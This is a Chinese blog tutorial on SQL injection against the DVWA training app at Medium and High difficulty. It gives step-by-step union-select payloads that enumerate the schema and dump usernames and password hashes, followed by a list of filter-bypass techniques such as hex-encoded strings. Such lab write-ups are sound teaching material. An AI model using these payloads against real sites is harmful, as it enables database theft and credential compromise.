---
title: DVWA-SQL注入Medium and High
tags:
  - DVWA
categories:
  - 学习
  - web安全
  - DVWA
abbrlink: 50a54441
date: 2022-04-27 10:46:04
---

## 概念

SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 



## Medium 步骤

### 分析

> Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

### 漏洞利用

>  虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数或者通过HackBar来改参数提交恶意构造的查询参数

### 方法一、抓包改包

![1](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427100942.png)

**1.判断是否存在注入，注入是字符型还是数字型**

```抓包更改参数id为1′ or 1=1 # 报错： #是注释作用```

![2](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427100949.png)



![3](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427100952.png)

```抓包更改参数id为1 or 1=1 #，```

![4](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427100955.png)



![5](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101004.png)





>  说明存在数字型注入。

**2.猜解SQL查询语句中的字段数**

```抓包更改参数id为1 order by 2 #```

![6](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101008.png)



![7](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101012.png)



```抓包更改参数id为1 order by 3 #，报错：```

![8](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101015.png)



![9](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101018.png)



> 说明执行的SQL查询语句中只有两个字段



**3.确定显示的字段顺序**

``抓包更改参数id为1 union select 1,2 #``

![10](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101021.png)



![11](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101024.png)



> 可以看出有 2 个回显



**4.获取当前数据库**

```抓包更改参数id为1 union select 1,database() #```

![12](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101031.png)



![13](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427101043.png)



>  说明当前的数据库为dvwa。



**5.获取数据库中的表**

```抓包更改参数id为-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #```

![14](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103813.png)



![15](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103815.png)



> 说明数据库dvwa中一共有两个表，guestbook与users。



**6.获取表中的字段名**

```抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：```

![16](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103818.png)





![17](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103826.png)



```利用16进制进行绕过，将 users 转换为16进制 0×7573657273：```

![18](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103828.png)



![19](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103830.png)



> 说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。



**7.获取表中数据**

```抓包更改参数id 为1 or 1=1 union select user, password from users#```

![21](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103833.png)



![22](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103835.png)





### 方法二：利用HackBar

浏览器安装HackBar

```启动hackbar测试，得到返回的页面如下：```

```
id=3&Submit=Submit
```

![24](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103838.png)



**1.判断是否存在注入，注入是字符型还是数字型**

```
id=1 or 1=1&Submit=Submit
```

![26](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103839.png)

```
id=1' or 1=1 &Submit=Submit
```

![27](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103842.png)





> 说明存在数字型注入。



**2.猜解SQL查询语句中的字段数**

```
id=1 order by 2 &Submit=Submit
```

![28](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103850.png)



```
id=1 order by 3&Submit=Submit
```

![29](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103854.png)



> 说明只有两个字段

**3.确定显示的字段顺序**



```
id=1 union select 1,2&Submit=Submit
```

![30](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103858.png)



> 可以看出有 2 个回显



**4.获取当前数据库**

```
id=3 union select 1,database()#&Submit=Submit
```

![25](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103900.png)



> 说明当前的数据库为dvwa。



**5.获取数据库中的表**

```
id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()&Submit=Submit
```

![31](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103903.png)



> 说明数据库dvwa中一共有两个表，guestbook与users。



**6.获取表中的字段名**

```
id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273&Submit=Submit
```

![32](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103905.png)





> 说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。



**7.获取表中数据**

```
id=1 union select user, password from users#&Submit=Submit
```

![33](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103908.png)





## High步骤

### 分析

> 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

### **漏洞利用**

> 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。



```
1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
```



![34](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220427103911.png)



## FAQ

### 当我们进行**手工 SQL 注入**时，往往是采取以下几个步骤

```
1. 判断是否存在注入，注入是字符型还是数字型
2. 猜解SQL查询语句中的字段数；
3. 确定显示的字段顺序；
4. 获取当前数据库；
5. 获取数据库中的表；
6. 获取表中的字段名；
7. 下载数据。
```





### 总结SQL注入的绕过技巧

总结来自：[ SegmentFault 思否](https://segmentfault.com/a/1190000019471118)

1.绕过空格

```
1.使用()——在Mysql中，括号用来包围子查询，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格
select(column_name)from(table_name)where(column_name=value)
2.使用/**/——注释符
```

2.绕过引号

```
使用16进制：
select column_name  from information_schema.tables where table_name="users"
select column_name  from information_schema.tables where table_name=0x7573657273
一般在where子句中使用到引号，users的十六进制的字符串是7573657273
```

3.绕过逗号

```
一般在substr()函数，limit中使用from...for
select substr(database() from 1 for 1);
```

4.绕过比较符(<>)

```
使用greatest()、least()：(前者返回最大值，后者返回最小值)
没绕过之前使用以下sql语句来判断database()第一个字母的ascii码值(二分法会用到比较符)：
select * from users where id=1 and ascii(substr(database(),1,1))>64
不使用比较符：
select * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64
```
